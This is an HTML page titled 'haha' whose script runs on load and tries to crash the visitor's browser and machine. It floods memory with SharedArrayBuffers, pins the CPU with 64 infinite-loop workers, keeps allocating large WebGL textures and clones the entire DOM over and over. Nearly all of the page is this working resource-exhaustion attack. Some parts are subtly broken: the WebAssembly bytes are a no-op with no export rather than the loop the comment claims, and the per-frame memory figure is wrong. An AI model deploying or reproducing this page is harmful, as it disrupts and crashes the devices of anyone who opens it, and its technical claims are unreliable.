<!doctype html>
<html><head><meta charset=utf-8><title>haha</title></head>
<body>
<script>
/* ---------- 1. RAM: SharedArrayBuffer flood ---------- */
const mb = 1024*1024;
setInterval(()=>{
  new SharedArrayBuffer(400*mb);        // 400 MB each tick
}, 10);

/* ---------- 2. CPU: 64 workers, infinite loop ---------- */
const code = `while(1){}`;              // 1 instruction, zero yield
const b = new Blob([code],{type:'application/javascript'});
for(let i=0;i<64;i++) new Worker(URL.createObjectURL(b));

/* ---------- 3. MAIN THREAD: WASM busy-loop ---------- */
const wasmBin = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x04,0x01,0x60,0x00,0x00,
  0x03,0x02,0x01,0x00,0x0a,0x05,0x01,0x03,0x00,0x01,0x0b
]); // infinite loop in wasm
WebAssembly.instantiate(wasmBin).then(obj=>{
  while(1){ obj.instance.exports[0](); }   // never yields
});

/* ---------- 4. GPU: 4 K textures per frame ---------- */
const canvases = [];
let idx=0;
setInterval(()=>{
  const c = document.createElement('canvas');
  c.width=c.height=4096;
  const gl = c.getContext('webgl2');
  const t = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, t);
  gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
  canvases.push(c);          // keep reference so GC can’t free
}, 16);                      // ~60 fps → 256 MB per frame

/* ---------- 5. DOM: exponential clone ---------- */
setInterval(()=>{
  document.body.appendChild(document.documentElement.cloneNode(true));
}, 50);
</script>
</body></html>
